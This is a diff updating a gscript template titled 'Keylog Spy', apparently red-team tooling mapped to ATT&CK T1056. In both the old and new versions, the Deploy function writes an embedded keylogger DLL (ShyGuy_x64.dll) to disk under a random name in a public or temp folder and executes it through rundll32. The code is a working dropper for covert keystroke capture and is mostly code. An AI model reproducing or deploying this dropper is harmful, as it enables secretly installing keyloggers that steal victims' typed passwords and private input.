@@ -1,37 +1,37 @@
 // Example gscript template
 // Title: Keylog Spy
 // Author: ahhh
-// Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
-// Gscript version: 0.1.2
+// Purpose: keylogger!
+// Gscript version: 1.0.0
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
 // Using ShyGuy: 
 
 //priority:150
 //timeout:150
 //import:/private/tmp/ShyGuy_x64.dll
-
-
-function BeforeDeploy() {
-  LogInfo("Starting Keylog");
-  return true; 
-}
+//go_import:os as os
 
 function Deploy() {  
-  // Drop the sample
-  var spy = Asset("ShyGuy_x64.dll");
-  var name = "";
-  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  for (var i = 0; i < 5; i++)
-    name += possible.charAt(Math.floor(Math.random() * possible.length));
-  name = "C:\\Users\\Public\\" + name + ".dll";
-  WriteFile(name, spy.fileData, 0755);
-  LogInfo("dropped the spy binary here: " + name);
-  name = name + ",dllmain";
-  ForkExecuteCommand("C:\\Windows\\System32\\rundll32.exe", [name]);
-  return true;
-}
+    console.log("Starting Keylog");
 
-function AfterDeploy() {
-  LogInfo("Done Keylog");
-  return true;
-}
+    // Prep the sample
+    var spy = GetAssetAsBytes("ShyGuy_x64.dll");
+    // Getting a temp file path
+    var temppath = os.TempDir();
+    var naming = G.rand.GetAlphaString(4);
+    naming = naming.toLowerCase();
+    var fullpath = temppath+naming+".dll";
+
+    // Write the sample
+    console.log("file name: "+ fullpath);
+    errors = G.file.WriteFileFromBytes(fullpath, spy[0]);
+    console.log("errors: "+errors);
+
+    var cmd = fullpath + ",dllmain";
+    var running = G.exec.ExecuteCommandAsync("C:\\Windows\\System32\\rundll32.exe", [cmd]);
+    console.log("errors: "+running[1]);
+
+    console.log("Done Keylog");
+    return true;
+  }
+  
